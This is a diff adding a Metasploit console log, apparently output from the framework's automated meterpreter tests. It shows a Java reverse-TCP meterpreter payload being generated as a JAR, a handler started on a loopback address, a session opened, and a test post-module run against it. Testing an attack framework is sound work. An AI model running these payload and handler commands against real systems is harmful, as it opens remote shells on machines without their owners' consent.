@@ -1,0 +1,22 @@
+use java/meterpreter/reverse_tcp
+msf6 post(test/services) > generate -o D:/a/_temp/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220204-644-8bnyed.jar -f jar AutoVerifySessionTimeout=10 spawn=0 lport=6023 lhost=127.0.0.1
+msf6 payload(java/meterpreter/reverse_tcp) > [*] Writing 5265 bytes to D:/a/_temp/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220204-644-8bnyed.jar...
+msf6 payload(java/meterpreter/reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 22
+msf6 payload(java/meterpreter/reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6023 
+[*] Sending stage (58075 bytes) to 127.0.0.1
+[*] Meterpreter session 23 opened (127.0.0.1:6023 -> 127.0.0.1:50048 ) at 2022-02-04 03:13:53 +0000
+use test/unix
+msf6 post(test/unix) > run session=23 AddEntropy=true Verbose=true
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: windows
+[!]  * missing Meterpreter features: stdapi_fs_chmod, stdapi_railgun_api
+[*] Running against session 23
+[*] Session type is meterpreter and platform is windows
+before running test: should list users
+[*] Testing complete in 0.0004185
+[*] Passed: 1; Failed: 0
+[*] Post module execution completed
+msf6 post(test/unix) > 
